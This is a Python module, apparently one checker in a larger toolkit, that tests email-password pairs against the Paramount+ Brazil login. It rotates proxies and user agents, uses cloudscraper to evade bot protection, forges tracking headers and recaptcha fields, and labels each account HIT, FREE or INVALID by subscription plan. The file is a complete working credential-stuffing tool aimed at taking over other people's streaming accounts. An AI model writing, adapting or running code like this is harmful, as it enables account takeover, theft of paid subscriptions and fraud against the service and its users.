# checkers/paramount.py
import cloudscraper
import random
import base64
import time
import os
from datetime import datetime

class ParamountChecker:
    # ====== CONSTANTES DEL ORIGINAL ======
    
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.90 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.84 Safari/537.36",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.70 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    ]
    
    # ====== FUNCIONES DEL ORIGINAL ======
    
    @staticmethod
    def get_country_flag(pais_code):
        flags = {
            "BR": "🇧🇷", "US": "🇺🇸", "MX": "🇲🇽", "AR": "🇦🇷", "CL": "🇨🇱",
            "CO": "🇨🇴", "PE": "🇵🇪", "EC": "🇪🇨", "VE": "🇻🇪", "UY": "🇺🇾",
            "PY": "🇵🇾", "BO": "🇧🇴", "CR": "🇨🇷", "PA": "🇵🇦", "DO": "🇩🇴"
        }
        return flags.get(pais_code, "🏳️")

    @staticmethod
    def pega_token(html, inicio, fim):
        try:
            return html.split(inicio, 1)[1].split(fim, 1)[0]
        except:
            return None

    # ====== FUNCIÓN PRINCIPAL check() ======
    
    @staticmethod
    def check(email: str, password: str, proxy: str = None) -> dict:
        """Verifica una cuenta de Paramount+"""
        
        # ====== CONFIGURACIÓN INICIAL ======
        RETRIES = 3
        EGO = 2
        
        for tentativa in range(RETRIES):
            try:
                # ====== PROXY ======
                proxies = None
                if proxy:
                    if "://" not in proxy:
                        proxy_url = f"http://{proxy}"
                    else:
                        proxy_url = proxy
                    proxies = {"http": proxy_url, "https": proxy_url}
                
                # ====== SCRAPER Y USER-AGENT ======
                scraper = cloudscraper.create_scraper()
                user_agent = random.choice(ParamountChecker.USER_AGENTS)
                
                headers = {
                    'User-Agent': user_agent,
                    'Accept-Language': 'pt-BR,pt;q=0.9',
                }
                
                # ====== PASO 1: GET a signin ======
                resp = scraper.get('https://www.paramountplus.com/br/account/signin/', headers=headers, proxies=proxies, timeout=30)
                
                # ====== VERIFICAR 403 ======
                if resp.status_code == 403:
                    # print(f"\033[93m{email}:{password} | BLOQUEADO (403) - Tentativa {tentativa + 1}/{RETRIES}\033[0m")
                    time.sleep(EGO)
                    continue
                
                # ====== VERIFICAR STATUS ======
                if resp.status_code != 200:
                    # print(f"\033[91m{email}:{password} | DIEStatus: {resp.status_code}\033[0m")
                    return {
                        'status': 'ERROR',
                        'email': email,
                        'password': password,
                        'error': f'HTTP {resp.status_code}'
                    }
                
                # ====== PASO 2: Extraer HTML ======
                html = resp.text
                
                # ====== PASO 3: Extraer tokens ======
                ac = ParamountChecker.pega_token(html, 'accountID:"', '"')
                tk = ParamountChecker.pega_token(html, 'trustKey:"', '"')
                ap = ParamountChecker.pega_token(html, 'agentID:"', '"')
                token = ParamountChecker.pega_token(html, "CBS.Registry.login.authToken = '", "'")
                
                # ====== PASO 4: Crear payload base64 ======
                post = f'{{"v":[0,1],"d":{{"ty":"Browser","ac":"{ac}","ap":"{ap}","id":"5a3571263aac1584","tr":"f4073545838d74da1c8c912f698ad19c","ti":1779495605565,"tk":"{tk}"}}}}'
                basecodado = base64.b64encode(post.encode('utf-8')).decode('utf-8')
                
                # ====== PASO 5: Headers POST ======
                headers_post = {
                    'Host': 'www.paramountplus.com',
                    'newrelic': basecodado,
                    'x-requested-with': 'XMLHttpRequest',
                    'User-Agent': user_agent,
                    'Accept': 'application/json, text/plain, */*',
                    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryLLrTBjCbwurB7JtK',
                    'Origin': 'https://www.paramountplus.com',
                    'Referer': 'https://www.paramountplus.com/br/account/signin/',
                    'Accept-Language': 'pt-BR,pt;q=0.9',
                }
                
                # ====== PASO 6: Data POST ======
                data = f'------WebKitFormBoundaryLLrTBjCbwurB7JtK\r\nContent-Disposition: form-data; name="email"\r\n\r\n{email}\r\n------WebKitFormBoundaryLLrTBjCbwurB7JtK\r\nContent-Disposition: form-data; name="password"\r\n\r\n{password}\r\n------WebKitFormBoundaryLLrTBjCbwurB7JtK\r\nContent-Disposition: form-data; name="tk_trp"\r\n\r\n{token}\r\n------WebKitFormBoundaryLLrTBjCbwurB7JtK\r\nContent-Disposition: form-data; name="recaptchaAction"\r\n\r\nFORM_SIGN_IN\r\n------WebKitFormBoundaryLLrTBjCbwurB7JtK\r\nContent-Disposition: form-data; name="recaptchaPartner"\r\n\r\nPPLUS\r\n------WebKitFormBoundaryLLrTBjCbwurB7JtK--'
                
                # ====== PASO 7: POST login ======
                response = scraper.post('https://www.paramountplus.com/br/account/xhr/login/', headers=headers_post, data=data, proxies=proxies, timeout=30)
                
                # ====== PASO 8: Procesar respuesta ======
                if response.status_code == 200:
                    data_json = response.json()
                    
                    # ====== PASO 9: Verificar success ======
                    if data_json.get("success"):
                        # ====== PASO 10: Extraer datos ======
                        user = data_json.get("user", {})
                        profile = user.get("profile", {})
                        svod = user.get("svod", {})
                        pacote = svod.get("user_package", {})
                        
                        # ====== PASO 11: Obtener plan ======
                        plano_nome = pacote.get("product_name", "Free Account")
                        if not plano_nome or plano_nome == "None":
                            plano_nome = "Free Account"
                        
                        # ====== PASO 12: Obtener país ======
                        pais_code = svod.get("userRegistrationCountry", "BR")
                        
                        # ====== PASO 13: Determinar tipo ======
                        tipo_plano = "Premium" if "premium" in str(plano_nome).lower() else "Standard"
                        if "free" in str(plano_nome).lower():
                            tipo_plano = "Free"
                        
                        # ====== PASO 14: Obtener bandera ======
                        pais_flag = ParamountChecker.get_country_flag(pais_code)
                        
                        is_premium = "Premium" in tipo_plano or "Standard" in tipo_plano
                        
                        return {
                            'status': 'HIT' if is_premium else 'FREE',
                            'email': email,
                            'password': password,
                            'plan': plano_nome,
                            'tipo': tipo_plano,
                            'country': f"{pais_flag} {pais_code}",
                            'is_premium': is_premium
                        }
                    else:
                        # ====== PASO 15: Error de credenciales ======
                        error_msg = data_json.get("error", "")
                        if "INVALID_CREDENTIALS" in error_msg:
                            return {
                                'status': 'INVALID',
                                'email': email,
                                'password': password
                            }
                        else:
                            return {
                                'status': 'INVALID',
                                'email': email,
                                'password': password
                            }
                else:
                    return {
                        'status': 'ERROR',
                        'email': email,
                        'password': password,
                        'error': f'HTTP {response.status_code}'
                    }
                    
            except Exception as e:
                # ====== PASO 16: Error general ======
                # print(f"\033[91m{email}:{password} | ERRO\033[0m")
                continue
        
        # ====== PASO 17: Bloqueado después de RETRIES ======
        return {
            'status': 'ERROR',
            'email': email,
            'password': password,
            'error': f'Bloqueado - {RETRIES} tentativas'
        }